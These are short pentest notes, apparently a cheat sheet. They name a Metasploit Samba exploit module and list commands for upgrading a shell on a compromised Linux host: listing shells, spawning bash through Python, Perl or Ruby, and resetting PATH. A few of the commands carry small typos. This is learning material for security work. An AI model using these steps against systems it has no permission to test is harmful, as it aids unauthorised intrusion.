* `use exploit/linux/samba/is_known_pipename`
* There is a possibility that bash is not installed on the target, so to list the installed shells:
* `cat /etc/shells`
* If a command shell is not obtained through `bin/bash -i`, then
* `python --version` --> Check if python is installed
* `python -c 'import pty;pty.spawn("bin/bash")'`
* Starting a command shell, if Perl is installed on the target:
  * `perl -e 'exec "bin/bash";'`
 
* With Ruby:
  * `ruby: exec "/bin/bash"`
 
* Within the bash shell:
* `env`
* If we can't see the PATH variable specifying the path where the system should look for binary, then:
* `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
* Difference between interactive and non interactice shells.
